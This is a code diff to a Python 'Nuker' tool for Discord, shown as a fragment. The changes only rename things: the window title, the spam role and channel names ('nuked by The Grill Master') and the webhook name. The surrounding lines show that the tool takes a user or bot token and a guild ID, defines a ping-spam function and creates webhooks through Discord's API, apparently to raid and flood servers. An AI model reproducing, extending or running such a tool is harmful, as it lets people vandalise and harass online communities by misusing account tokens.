@@ -9,12 +9,12 @@ from tasksio import TaskPool
 import random
 import threading
 
-os.system("title Honoured Nuker")
+os.system("title Grill Master Nuker")
 
 token = input(Colorate.Horizontal(Colors.cyan_to_blue, "\n [+] User/Bot token: ",1,0))
 guild_id = input(Colorate.Horizontal(Colors.cyan_to_blue, " [+] Guild id: (server nuker only, if you're using account nuker leave blank) ",1,0))
 
-spam_role_channels = ["nuked by sakai","by sakai","sakai solos"]
+spam_role_channels = ["nuked by The Grill Master","by Piccolo","Junior solos"]
 headers2={"Authorization": token}
 headers={"Authorization": f"Bot {token}"}
 
@@ -87,7 +87,7 @@ async def ping_spam(content,c_id):
 def create_webhook(channel_id):
     channel_id = int(channel_id)
     payload = {
-        "name": "The Honoured One"
+        "name": "The Grill Master"
     }
     r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", json=payload, headers=headers)
     if r.status_code == 200:
